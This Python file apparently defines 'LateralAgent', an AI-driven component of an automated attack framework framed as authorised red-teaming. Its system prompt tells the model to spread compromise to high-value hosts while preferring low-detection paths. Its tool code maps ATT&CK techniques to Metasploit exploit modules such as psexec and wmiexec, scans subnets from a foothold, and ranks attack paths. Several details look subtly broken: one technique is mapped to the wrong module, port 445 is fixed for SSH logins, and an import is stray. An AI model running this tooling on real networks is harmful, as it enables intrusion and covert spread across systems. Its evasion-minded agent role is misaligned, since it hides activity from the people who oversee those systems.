from __future__ import annotations
import networkx as nx
from typing import Any, Dict, List, Optional, Tuple
from agents.base import BaseAgent
from mdp.state import AttackState


LATERAL_SYSTEM_PROMPT = """
You are LateralAgent operating within an authorised red-team evaluation. Given an established foothold,
your task is to map the reachable network, identify lateral movement paths using MITRE ATT&CK techniques,
and extend compromise to high-value hosts. Prefer paths with lower detection probability.
Techniques: T1021 (Remote Services), T1047 (WMI), T1053 (Scheduled Tasks), T1078 (Valid Accounts).
"""


class LateralAgent(BaseAgent):
    def __init__(self, llm_config, exec_config, memory, msf_client) -> None:
        self._msf = msf_client
        self._reachability_graph = nx.DiGraph()
        super().__init__(
            name="LateralAgent",
            system_prompt=LATERAL_SYSTEM_PROMPT,
            llm_config=llm_config,
            exec_config=exec_config,
            memory=memory,
        )

    def _register_tools(self) -> None:
        self.tools.register(
            name="build_reachability_graph",
            fn=self._build_graph,
            schema={
                "name": "build_reachability_graph",
                "description": "Build a lateral reachability graph from a compromised host. Returns adjacency with ATT&CK technique weights.",
                "input_schema": {
                    "type": "object",
                    "properties": {
                        "source_host": {"type": "string"},
                        "session_id": {"type": "string"},
                    },
                    "required": ["source_host", "session_id"],
                },
            },
        )
        self.tools.register(
            name="execute_lateral_move",
            fn=self._execute_lateral,
            schema={
                "name": "execute_lateral_move",
                "description": "Execute a lateral movement technique from a compromised host to a reachable target.",
                "input_schema": {
                    "type": "object",
                    "properties": {
                        "technique_id": {"type": "string"},
                        "source_host": {"type": "string"},
                        "target_host": {"type": "string"},
                        "credentials": {"type": "object"},
                    },
                    "required": ["technique_id", "source_host", "target_host"],
                },
            },
        )

    def _build_graph(self, source_host: str, session_id: str) -> Dict:
        arp_result = self._msf.run_post_module(
            session_id=session_id,
            module="post/multi/gather/arp_scanner",
            options={"RHOSTS": "subnet"},
        )
        reachable = arp_result.get("hosts", [])
        edges = []
        for host in reachable:
            weight = self._estimate_success_probability(source_host, host)
            self._reachability_graph.add_edge(
                source_host, host["ip"],
                technique="T1021",
                weight=weight,
            )
            edges.append({"source": source_host, "target": host["ip"], "weight": weight})
        return {"edges": edges, "reachable_count": len(reachable)}

    def _estimate_success_probability(self, source: str, target: Dict) -> float:
        open_ports = set(target.get("ports", []))
        score = 0.3
        if 22 in open_ports:
            score += 0.2
        if 445 in open_ports:
            score += 0.25
        if 3389 in open_ports:
            score += 0.15
        if 5985 in open_ports or 5986 in open_ports:
            score += 0.1
        return min(score, 0.95)

    def _execute_lateral(
        self,
        technique_id: str,
        source_host: str,
        target_host: str,
        credentials: Optional[Dict] = None,
    ) -> Dict:
        technique_to_module = {
            "T1021.001": "exploit/windows/smb/psexec",
            "T1021.002": "exploit/windows/smb/psexec",
            "T1047": "exploit/windows/wmi/wmiexec",
            "T1078": "auxiliary/scanner/ssh/ssh_login",
        }
        module = technique_to_module.get(technique_id, "exploit/multi/handler")
        result = self._msf.execute(
            module_path=module,
            rhosts=target_host,
            rport=445,
            extra_options=credentials or {},
        )
        return {"technique": technique_id, "target": target_host, "result": result}

    def shortest_path(self, source: str, target: str) -> List[str]:
        try:
            path = nx.shortest_path(
                self._reachability_graph,
                source=source,
                target=target,
                weight=lambda u, v, d: 1.0 - d.get("weight", 0.5),
            )
            return path
        except nx.NetworkXNoPath:
            return []

    def run(self, state: AttackState, task: str) -> Tuple[bool, str, Any]:
        success, steps, result = self._react_loop(state, task)
        return success, "\n".join(s.observation for s in steps), result


from typing import Optional
